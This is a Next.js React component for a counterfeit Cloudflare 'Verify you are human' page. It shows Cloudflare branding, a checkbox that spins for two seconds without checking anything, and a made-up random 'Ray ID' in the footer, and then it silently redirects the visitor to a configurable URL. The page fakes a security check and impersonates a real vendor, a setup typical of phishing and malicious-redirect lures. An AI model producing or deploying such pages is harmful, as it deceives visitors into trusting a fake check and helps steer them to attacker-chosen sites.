"use client";

import Image from "next/image";
import logo from "@/public/pngegg(6).png";
import { useEffect, useState } from "react";

export default function VerificationPage() {
  const siteName = process.env.NEXT_PUBLIC_SITE_NAME
    ? process.env.NEXT_PUBLIC_SITE_NAME
    : "www.sample.com";
  const heading =
    process.env.NEXT_PUBLIC_VERIFY_TITLE ||
    "Checking if the site connection is secure";
  const bottomMsg =
    process.env.NEXT_PUBLIC_VERIFY_BOTTOM ||
    `${siteName} needs to review the security of your connection before proceeding.`;
  const brand = process.env.NEXT_PUBLIC_BRAND_NAME || "Cloudflare";
  const redirectUrl =
    process.env.NEXT_PUBLIC_VERIFY_REDIRECT || "https://example.com";
  const redirectDelayMs = parseInt(
    process.env.NEXT_PUBLIC_REDIRECT_AFTER_MS || "0",
    0
  );

  // ...existing code...

  return (
    <section className="w-full h-screen flex items-center justify-center">
      <main className="min-h-screen max-w-[1000px] w-full bg-white font-sans text-gray-900 flex flex-col justify-between">
        <div className="max-w-2xl px-6 pt-40 pb-12">
          <h1 className="mb-6 text-2xl font-normal">{siteName}</h1>
          <h2 className="mb-8 text-xl font-normal">{heading}</h2>

          <CloudflareVerificationWidget
            brand={brand}
            redirectUrl={redirectUrl}
            redirectDelayMs={redirectDelayMs}
          />

          <p className="mt-8 text-base leading-relaxed text-gray-700">
            {bottomMsg}
          </p>
        </div>
        <div className="mx-auto pb-28">
          <RayFooter brand={brand} />
        </div>
      </main>
    </section>
  );
}

/* Widget */
function CloudflareVerificationWidget({
  brand,
  redirectUrl,
  redirectDelayMs,
}: {
  brand: string;
  redirectUrl: string;
  redirectDelayMs: number;
}) {
  const [checked, setChecked] = useState(false);
  const [spinning, setSpinning] = useState(false);

  const privacyHref = process.env.NEXT_PUBLIC_PRIVACY_URL || "#";
  const termsHref = process.env.NEXT_PUBLIC_TERMS_URL || "#";

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (!checked && e.target.checked) {
      setSpinning(true);
      setTimeout(() => {
        setSpinning(false);
        setChecked(true);
        setTimeout(() => {
          if (redirectUrl) window.location.href = redirectUrl;
        }, Math.max(0, redirectDelayMs));
      }, 2000);
    }
  };

  return (
    <div className="w-full max-w-sm rounded-sm border border-gray-300 bg-gray-50 p-4">
      <div className="flex items-center gap-4">
        {/* Left: checkbox + label */}
        <div className="flex items-center gap-3 pt-1">
          <div className="relative">
            <input
              id="human-verification"
              type="checkbox"
              checked={checked}
              onChange={handleChange}
              disabled={spinning || checked}
              className={`h-6 w-6 cursor-pointer rounded-sm border-2 border-gray-400 bg-white checked:border-blue-600 checked:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-1 ${
                spinning ? "opacity-0" : "opacity-100"
              } disabled:cursor-default`}
              aria-describedby="hv-status"
            />
            {spinning && (
              <div className="absolute top-0.5 left-0.5 h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-blue-600" />
            )}
            {checked && !spinning && (
              <svg
                className="pointer-events-none absolute top-0.5 left-0.5 h-5 w-5 text-white"
                viewBox="0 0 20 20"
                fill="currentColor"
                aria-hidden="true"
              >
                <path
                  fillRule="evenodd"
                  d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                  clipRule="evenodd"
                />
              </svg>
            )}
          </div>
          <label
            htmlFor="human-verification"
            className="cursor-pointer text-base text-gray-900 select-none"
          >
            Verify you are human
          </label>
        </div>

        {/* Right: Logo + buttons */}
        <div className="ml-auto flex flex-col justify-center items-end min-w-[110px]">
          <div className="w-full flex items-center justify-end">
            <Image
              src={logo}
              alt={`${brand} logo`}
              className="w-28 h-auto object-contain "
              priority
            />
          </div>

          <div className=" flex justify-end items-center w-full gap-2">
            <a
              href={privacyHref}
              className="text-[11px]  hover:underline text-center"
            >
              Privacy
            </a>

            <a
              href={termsHref}
              className="text-[11px]  hover:underline text-center"
            >
              Terms
            </a>
          </div>
        </div>
      </div>

      {/* Status row */}
      {/* <div
        id="hv-status"
        className="mt-3 text-xs text-gray-600 min-h-[16px]"
        aria-live="polite"
      >
        {spinning && <span className="text-blue-600">Checking…</span>}
        {checked && !spinning && (
          <span className="text-green-600">Verified — redirecting…</span>
        )}
      </div> */}
    </div>
  );
}

// Add RayFooter component
function RayFooter({ brand }: { brand: string }) {
  const perfText =
    process.env.NEXT_PUBLIC_PERF_SECURITY_TEXT || "Performance & security of";
  const [rayId, setRayId] = useState("...");

  useEffect(() => {
    if (typeof window !== "undefined") {
      const path = window.location.pathname || "/";
      const base = path.length.toString(16);
      const rand = Math.random().toString(16).slice(2, 10);
      setRayId(`${base}-${rand}`);
    }
  }, []);

  return (
    <div className="mt-10 text-center  pt-4 text-[14px] leading-relaxed text-gray-600">
      <p>
        Ray ID: <span className="font-mono text-gray-800">{rayId}</span>
      </p>
      <p>
        {perfText} <span className=" text-gray-800">{brand}</span>
      </p>
    </div>
  );
}
